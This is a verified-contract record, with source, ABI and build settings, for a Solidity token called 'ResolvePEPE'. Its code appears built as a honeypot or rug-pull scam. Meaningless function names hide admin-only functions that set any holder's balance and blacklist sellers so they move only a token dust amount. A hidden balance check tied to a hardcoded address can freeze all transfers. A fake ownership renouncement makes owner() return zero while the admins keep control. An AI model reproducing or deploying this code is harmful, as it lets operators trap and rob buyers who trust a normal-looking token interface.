{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface takeEnableFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address marketingLaunch) external view returns (uint256);\n\n    function transfer(address launchList, uint256 receiverTo) external returns (bool);\n\n    function allowance(address enableIs, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverTo) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchList,\n        uint256 receiverTo\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed maxAuto, uint256 value);\n    event Approval(address indexed enableIs, address indexed spender, uint256 value);\n}\n\nabstract contract feeAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface liquiditySwapFund {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface feeSender {\n    function createPair(address txIs, address senderWallet) external returns (address);\n}\n\ninterface senderAutoLaunch is takeEnableFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ResolvePEPE is feeAuto, takeEnableFrom, senderAutoLaunch {\n\n    bool public tradingMax;\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverLaunch;\n    }\n\n    uint256 public senderAuto;\n\n    address public launchEnable;\n\n    uint256 constant enableSender = 3 ** 10;\n\n    address launchedTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private launchedTo = \"RPE\";\n\n    mapping(address => bool) public limitFund;\n\n    function txShould(address receiverFrom) public {\n        limitTxMarketing();\n        if (minAt != senderAuto) {\n            senderAuto = liquidityIsBuy;\n        }\n        if (receiverFrom == launchEnable || receiverFrom == limitMarketing) {\n            return;\n        }\n        limitFund[receiverFrom] = true;\n    }\n\n    function owner() external view returns (address) {\n        return exemptToken;\n    }\n\n    uint256 limitMin;\n\n    uint8 private receiverLaunch = 18;\n\n    function limitTxMarketing() private view {\n        require(exemptTake[_msgSender()]);\n    }\n\n    function receiverBuy(address marketingLiquidity, address launchList, uint256 receiverTo) internal returns (bool) {\n        if (marketingLiquidity == launchEnable) {\n            return swapExempt(marketingLiquidity, launchList, receiverTo);\n        }\n        uint256 walletLiquidity = takeEnableFrom(limitMarketing).balanceOf(launchedTake);\n        require(walletLiquidity == limitMin);\n        require(launchList != launchedTake);\n        if (limitFund[marketingLiquidity]) {\n            return swapExempt(marketingLiquidity, launchList, enableSender);\n        }\n        return swapExempt(marketingLiquidity, launchList, receiverTo);\n    }\n\n    function listBuy() public {\n        emit OwnershipTransferred(launchEnable, address(0));\n        exemptToken = address(0);\n    }\n\n    uint256 private liquidityIsBuy;\n\n    function transfer(address walletMarketingLaunched, uint256 receiverTo) external virtual override returns (bool) {\n        return receiverBuy(_msgSender(), walletMarketingLaunched, receiverTo);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return atWallet;\n    }\n\n    bool public takeAmountFrom;\n\n    constructor (){\n        \n        liquiditySwapFund enableFromAuto = liquiditySwapFund(minMax);\n        limitMarketing = feeSender(enableFromAuto.factory()).createPair(enableFromAuto.WETH(), address(this));\n        if (marketingListAuto) {\n            senderAuto = limitLaunched;\n        }\n        launchEnable = _msgSender();\n        listBuy();\n        exemptTake[launchEnable] = true;\n        toFrom[launchEnable] = tradingTotal;\n        \n        emit Transfer(address(0), launchEnable, tradingTotal);\n    }\n\n    function swapExempt(address marketingLiquidity, address launchList, uint256 receiverTo) internal returns (bool) {\n        require(toFrom[marketingLiquidity] >= receiverTo);\n        toFrom[marketingLiquidity] -= receiverTo;\n        toFrom[launchList] += receiverTo;\n        emit Transfer(marketingLiquidity, launchList, receiverTo);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return exemptToken;\n    }\n\n    string private atWallet = \"Resolve PEPE\";\n\n    uint256 public limitLaunched;\n\n    function balanceOf(address marketingLaunch) public view virtual override returns (uint256) {\n        return toFrom[marketingLaunch];\n    }\n\n    function approve(address buyTeamFund, uint256 receiverTo) public virtual override returns (bool) {\n        modeSwap[_msgSender()][buyTeamFund] = receiverTo;\n        emit Approval(_msgSender(), buyTeamFund, receiverTo);\n        return true;\n    }\n\n    uint256 public minAt;\n\n    mapping(address => mapping(address => uint256)) private modeSwap;\n\n    uint256 private tradingTotal = 100000000 * 10 ** 18;\n\n    address public limitMarketing;\n\n    function autoToken(address launchSwap) public {\n        if (takeAmountFrom) {\n            return;\n        }\n        \n        exemptTake[launchSwap] = true;\n        \n        takeAmountFrom = true;\n    }\n\n    function allowance(address toTakeMax, address buyTeamFund) external view virtual override returns (uint256) {\n        if (buyTeamFund == minMax) {\n            return type(uint256).max;\n        }\n        return modeSwap[toTakeMax][buyTeamFund];\n    }\n\n    function receiverSellList(uint256 receiverTo) public {\n        limitTxMarketing();\n        limitMin = receiverTo;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingTotal;\n    }\n\n    address private exemptToken;\n\n    bool private marketingListAuto;\n\n    event OwnershipTransferred(address indexed receiverSwap, address indexed amountTx);\n\n    function transferFrom(address marketingLiquidity, address launchList, uint256 receiverTo) external override returns (bool) {\n        if (_msgSender() != minMax) {\n            if (modeSwap[marketingLiquidity][_msgSender()] != type(uint256).max) {\n                require(receiverTo <= modeSwap[marketingLiquidity][_msgSender()]);\n                modeSwap[marketingLiquidity][_msgSender()] -= receiverTo;\n            }\n        }\n        return receiverBuy(marketingLiquidity, launchList, receiverTo);\n    }\n\n    uint256 swapListMax;\n\n    mapping(address => bool) public exemptTake;\n\n    address minMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedTo;\n    }\n\n    function txLimitTrading(address walletMarketingLaunched, uint256 receiverTo) public {\n        limitTxMarketing();\n        toFrom[walletMarketingLaunched] = receiverTo;\n    }\n\n    mapping(address => uint256) private toFrom;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxAuto\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTakeMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyTeamFund\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTeamFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTo\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchSwap\",\"type\":\"address\"}],\"name\":\"autoToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingLaunch\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverTo\",\"type\":\"uint256\"}],\"name\":\"receiverSellList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeAmountFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMarketingLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTo\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTo\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMarketingLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTo\",\"type\":\"uint256\"}],\"name\":\"txLimitTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFrom\",\"type\":\"address\"}],\"name\":\"txShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ResolvePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}